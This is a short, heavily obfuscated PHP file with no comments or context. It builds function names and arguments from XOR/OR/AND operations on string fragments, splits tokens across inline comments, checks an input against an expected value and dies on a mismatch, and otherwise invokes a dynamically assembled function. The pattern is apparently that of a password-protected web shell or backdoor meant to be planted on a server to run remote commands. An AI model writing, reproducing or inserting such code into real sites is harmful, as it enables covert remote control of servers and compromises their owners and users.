<?php
$Mc='CNeLealzvc'.wJrxwbAT;$mI='m.5'&o47;$NtLF="(# ZI@DT)!I\$"|'*!"'.HkHHE1.#zRy0ri'.
    '"M,';$NP7TwL9='X}'.UIJ9ZJIFOQGEMCY|XuFQ_aETOMEAYJh.'[Q';$GKbxq=JPFE.'[a0'|'QH'.
    'F]Dic';$_5dzR="M%[4"^'|U9l';$xG=QEBK7E|TUMM1.'@';$UY2osnaf=H|H;$M_G=TDP|#wqCF'.
    '@P@';$g4sNA12=G|_;$UWViqP=i^'(';$aVIZnJ="e,"|' a';$rZiweV8='|'&x;$u0IfK=#ttLn'.
    '}G'&gc;$pddV5CwPN7='}'^'3';$s3f=p&r;$JA_KU2z1sW=('!@ '|'!@%')|$mI;$s6=$xG^(/*'.
    'z;Y(w^*/evSW5I^'WFh}lz');$sw4cxzn_P=('oaH=v6[J1,W~]4'^'L@,Q(W:+Ag1*7W')|(/*cp'.
    'VTB*/wmlx_.']{'.EF_O.'}>E'&bCnogWs.']'.J_Vwo.'{');$hgX4VOkySOU=("5".q5rc./*Bx'.
    'T*/":7j8;}7a1!kw`".Lcve."`::".p618."~<r"&'3ns= bm7 91{=p5!95us<%1'.qe4ku.#nVF'.
    '}aq>')|('%D04@ 03A!  8 '.e903.'`! D0$`!3 )"$"'|'1D1!D`03A  $) E81 `#0E0%A 3 9'.
    '! "');$EavBBRcu=(RPA8.' 2)%UB&I'|XAF54.'*)!TB(H')^$NtLF;$BPpQ=(']u~w_^'./*POO'.
    '}>eJMy*/_Oo_y.'{_M}W}'&'lV|r_^_No[{k_[M_m')&$NP7TwL9;if($JA_KU2z1sW($s6(/*TZc'.
    'Xj_i(*/$UY2osnaf.$M_G.$g4sNA12.$UWViqP))!=$hgX4VOkySOU)die;$sw4cxzn_P(/*zJ0l5'.
    'G7c@*/$EavBBRcu,$g4sNA12.$GKbxq.$aVIZnJ.$rZiweV8,$s6($BPpQ),$u0IfK.$_5dzR./*d'.
    'LW>,RSK*/$pddV5CwPN7.$s3f);#jN@2*k$Q%eXGn) y6i!HC~[AOq=j1@9wL!]M>?]dlEbr!My4'.
    'BBQ#Kg@G!; Y|@.]Sj?oTF<&X!?Ls&Ax_ t740?%|85?C';